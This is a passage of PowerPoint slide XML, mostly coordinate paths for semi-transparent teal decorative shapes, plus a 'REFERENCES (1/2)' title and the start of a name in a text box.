                  <a:pt x="3197123" y="2132800"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6664452" y="2820923"/>
            <a:ext cx="307975" cy="364490"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="307975" h="364489">
                <a:moveTo>
                  <a:pt x="153924" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="137233" y="52785"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="111959" y="95963"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79638" y="130960"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41806" y="159203"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="182117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43866" y="212165"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79784" y="240773"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="109161" y="272570"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="133404" y="312182"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153924" y="364236"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="168639" y="313657"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190146" y="272149"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="219687" y="237719"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258506" y="208373"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="307848" y="182117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="263993" y="155472"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226545" y="120225"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="195632" y="80089"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="171382" y="38776"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153924" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9073895" y="3404615"/>
            <a:ext cx="306705" cy="364490"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="306704" h="364489">
                <a:moveTo>
                  <a:pt x="153161" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="126577" y="50651"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98554" y="92762"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68506" y="127759"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35850" y="157069"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="182118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="49981" y="205337"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="87032" y="238030"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114409" y="277325"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135367" y="320350"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153161" y="364236"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="171248" y="315388"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="191786" y="274966"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="218596" y="240755"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="255501" y="210543"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="306324" y="182118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="258878" y="160117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="217480" y="131600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="184489" y="95871"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162263" y="52236"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153161" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7788208" y="3130295"/>
            <a:ext cx="114300" cy="401320"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="114300" h="401320">
                <a:moveTo>
                  <a:pt x="58868" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="37401" y="5925"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20958" y="19018"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9754" y="36254"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4004" y="54609"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9807" y="105198"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9366" y="152531"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5623" y="198453"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1520" y="244808"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="293443"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4004" y="346201"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20101" y="384651"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58868" y="400812"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76477" y="395547"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="94586" y="382127"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108552" y="364396"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113732" y="346201"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106085" y="286811"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="104757" y="238995"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107302" y="197310"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="111276" y="156313"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114234" y="110561"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113732" y="54609"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112499" y="35254"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100539" y="18446"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81460" y="6068"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58868" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7791140" y="2766060"/>
            <a:ext cx="115570" cy="254635"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="115570" h="254635">
                <a:moveTo>
                  <a:pt x="55935" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="33397" y="2905"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15835" y="15430"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4607" y="33861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1071" y="54482"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1714" y="95190"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="158317"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1071" y="200025"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15882" y="237553"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55935" y="254507"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="75241" y="248281"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="92178" y="237077"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="104709" y="220968"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110799" y="200025"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110085" y="153906"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113085" y="117109"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110799" y="54482"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96273" y="18192"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79063" y="4548"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55935" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8196276" y="3469489"/>
            <a:ext cx="170180" cy="391160"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="170179" h="391160">
                <a:moveTo>
                  <a:pt x="107801" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="88917" y="7929"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73606" y="22288"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63295" y="40790"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57505" y="101550"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44240" y="151200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12288" y="234461"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2103" y="276713"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1446" y="325143"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="346225"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7209" y="365593"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21538" y="381150"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41451" y="390802"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44499" y="389786"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47928" y="390929"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="52373" y="390802"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69300" y="390425"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="83774" y="382357"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96200" y="368478"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106983" y="350670"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="115542" y="299004"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="127110" y="252255"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="139955" y="208018"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152346" y="163886"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162549" y="117455"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="168832" y="66317"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="170082" y="41344"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162831" y="21121"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="148580" y="7113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128827" y="785"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107801" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8307451" y="3034815"/>
            <a:ext cx="156845" cy="327025"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="156845" h="327025">
                <a:moveTo>
                  <a:pt x="53909" y="325096"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="45084" y="325096"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47117" y="326874"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50926" y="325604"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53909" y="325096"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="156845" h="327025">
                <a:moveTo>
                  <a:pt x="112826" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="89927" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70865" y="8643"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56372" y="23915"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47244" y="43791"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42915" y="90945"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30815" y="128694"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16154" y="164455"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4145" y="205648"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="259691"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1875" y="283920"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10048" y="303791"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23199" y="318091"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40004" y="325604"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45084" y="325096"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53909" y="325096"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100451" y="302315"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114811" y="239921"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="127771" y="199783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142596" y="160767"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="153910" y="118708"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156337" y="69445"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156082" y="68556"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156718" y="67413"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156337" y="65762"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="151602" y="43981"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="143224" y="23915"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130512" y="8326"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112826" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8558783" y="3312588"/>
            <a:ext cx="355600" cy="474980"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="355600" h="474979">
                <a:moveTo>
                  <a:pt x="295513" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="276461" y="7439"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="259207" y="25987"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240641" y="72231"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="213437" y="116120"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="180330" y="158006"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144056" y="198242"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107351" y="237182"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72949" y="275180"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43587" y="312588"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21999" y="349759"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10922" y="387048"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6322" y="395918"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3175" y="403336"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1170" y="410801"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="419814"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="480" y="439600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12223" y="455136"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31539" y="466695"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54737" y="474551"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67730" y="473170"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80105" y="468741"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="91670" y="460835"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="102235" y="449024"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="124743" y="392925"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="149753" y="346262"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="176736" y="306704"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="205165" y="271919"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="234512" y="239574"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="264249" y="207338"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="293848" y="172879"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322780" y="133865"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="350520" y="87963"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="355274" y="67107"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="354933" y="47037"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="348734" y="29206"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="335915" y="15065"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315589" y="2823"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="295513" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315072" y="3389927"/>
            <a:ext cx="183515" cy="470534"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="183515" h="470535">
                <a:moveTo>
                  <a:pt x="63563" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="25288" y="11437"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="45021"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="68409"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19116" y="123697"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31324" y="176322"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="39121" y="227056"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45009" y="276673"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="51484" y="325945"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61048" y="375646"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76200" y="426549"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110811" y="466054"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="130555" y="470364"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="138049" y="470237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="141477" y="466681"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163014" y="459206"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="176895" y="444313"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="183036" y="424158"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="181355" y="400895"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="169797" y="350392"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162708" y="303645"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="157546" y="258270"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="151766" y="211879"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142824" y="162087"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128178" y="106507"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105282" y="42755"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100282" y="20518"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="84423" y="6115"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63563" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7237124" y="3037322"/>
            <a:ext cx="139065" cy="254635"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="139065" h="254635">
                <a:moveTo>
                  <a:pt x="97192" y="252358"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="87219" y="252358"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="93315" y="254263"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95601" y="252993"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="97192" y="252358"/>
                </a:lnTo>
                <a:close/>
              </a:path>
              <a:path w="139065" h="254635">
                <a:moveTo>
                  <a:pt x="62823" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="40737" y="1660"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23284" y="9346"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8653" y="24663"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="44862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="478" y="67192"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7685" y="106293"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12606" y="141011"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29688" y="209305"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="51325" y="243199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="84679" y="252993"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="87219" y="252358"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="97192" y="252358"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117054" y="244433"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132161" y="229181"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="139053" y="209452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135860" y="187461"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="123795" y="149129"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="118302" y="108737"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114286" y="72179"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106650" y="45348"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106269" y="43951"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106777" y="43189"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106650" y="41665"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96565" y="21967"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81694" y="7423"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62823" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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13" name="object 13" descr=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6782789" y="3318843"/>
            <a:ext cx="357505" cy="468630"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="357504" h="468629">
                <a:moveTo>
                  <a:pt x="61636" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9663" y="27636"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="65748"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6502" y="85518"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35361" y="119591"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63338" y="159853"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90670" y="204296"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144349" y="297706"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="171170" y="342660"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="198295" y="383773"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="225961" y="419039"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="254406" y="446452"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="260840" y="455723"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="271583" y="462232"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="284660" y="466312"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298094" y="468296"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="307304" y="468254"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="346840" y="444519"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="356989" y="403300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="345465" y="384476"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="312195" y="352054"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280895" y="313946"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="251335" y="271766"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223283" y="227127"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="196508" y="181644"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="170779" y="136930"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="145866" y="94599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121537" y="56265"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="97561" y="23542"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80010" y="6276"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61636" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="006379">
              <a:alpha val="10195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 txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962050" y="557529"/>
            <a:ext cx="4095115" cy="57404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160"/>
              <a:t>REFERENCES</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-180"/>
              <a:t>(1/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="object 16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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
